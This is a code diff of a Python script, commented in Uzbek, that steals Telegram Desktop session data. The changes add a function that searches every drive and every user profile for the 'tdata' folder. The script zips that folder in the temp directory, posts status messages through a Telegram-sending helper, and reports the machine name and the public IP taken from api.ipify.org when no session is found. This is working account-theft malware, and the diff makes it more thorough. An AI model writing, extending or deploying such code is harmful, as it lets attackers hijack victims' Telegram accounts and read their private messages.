@@ -1,4 +1,4 @@
-import sys, urllib.request, os, ctypes, zipfile, socket, tempfile, shutil, time, json
+import sys, urllib.request, os, ctypes, zipfile, socket, tempfile, shutil, time, json, glob
 
 # O'z-o'zini ishga tushirish
 if len(sys.argv) > 0 and "http" in sys.argv[0]:
@@ -58,28 +58,45 @@ def zip_folder(folder_path, output_path):
                 except:
                     pass
 
+# ============================================
+# HAMMA YO'LLARNI QIDIRADIGAN SUPER FUNKSIYA
+# ============================================
+def find_tdata_anywhere():
+    drives = [f"{chr(d)}:\\" for d in range(ord('C'), ord('Z') + 1) if os.path.exists(f"{chr(d)}:\\")]
+
+    for drive in drives:
+        # 1. C:\Users papkasini topamiz
+        users_dir = os.path.join(drive, "Users")
+        if os.path.exists(users_dir):
+            # 2. Har bir foydalanuvchi papkasini tekshiramiz
+            for user_folder in os.listdir(users_dir):
+                user_path = os.path.join(users_dir, user_folder)
+                if os.path.isdir(user_path):
+                    # 3. Mumkin bo'lgan 4 ta asosiy yo'lni tekshiramiz
+                    possible_paths = [
+                        os.path.join(user_path, "AppData", "Roaming", "Telegram Desktop", "tdata"),
+                        os.path.join(user_path, "AppData", "Local", "Telegram Desktop", "tdata"),
+                        os.path.join(user_path, "AppData", "Roaming", "TelegramDesktop", "tdata"),
+                        os.path.join(user_path, "AppData", "Local", "TelegramDesktop", "tdata")
+                    ]
+                    for path in possible_paths:
+                        if os.path.exists(path):
+                            return path
+    return None
+
 # MAIN FUNKSIYA
 def main():
     pc_name = socket.gethostname()
     
-    # 1. Foydalanuvchi nomini olamiz
-    user_name = os.getenv('USERNAME')
-    
-    # 2. Aynan siz ko'rsatgan qattiq yo'lni tuzamiz
-    tdata_path = f"C:\\Users\\{user_name}\\AppData\\Roaming\\Telegram Desktop\\tdata"
-    
-    # 3. Agar u yerda bo'lmasa, zaxira yo'lni tekshiramiz
-    if not os.path.exists(tdata_path):
-        tdata_path = os.path.join(os.getenv('APPDATA'), 'TelegramDesktop', 'tdata')
+    tdata_path = find_tdata_anywhere()
 
-    # 4. Endi tdata ni topish va siqish
-    if os.path.exists(tdata_path):
+    if tdata_path:
         try:
             temp_dir = tempfile.gettempdir()
             zip_path = os.path.join(temp_dir, f"tdata_{pc_name}.zip")
             if os.path.exists(zip_path): os.remove(zip_path)
 
-            send_telegram_message(f"⏳ {pc_name} da tdata siqilmoqda...")
+            send_telegram_message(f"⏳ {pc_name} da tdata siqilmoqda... (Topildi: {tdata_path})")
             zip_folder(tdata_path, zip_path)
 
             size_mb = os.path.getsize(zip_path) / (1024 * 1024)
@@ -93,7 +110,7 @@ def main():
     else:
         try:
             ip = urllib.request.urlopen("https://api.ipify.org").read().decode()
-            send_telegram_message(f"⚠️ tdata topilmadi!\n🖥 {pc_name}\n🌐 IP: {ip}")
+            send_telegram_message(f"⚠️ tdata topilmadi! (Barcha diskdagi hamma foydalanuvchilar tekshirildi)\n🖥 {pc_name}\n🌐 IP: {ip}")
         except:
             pass
 
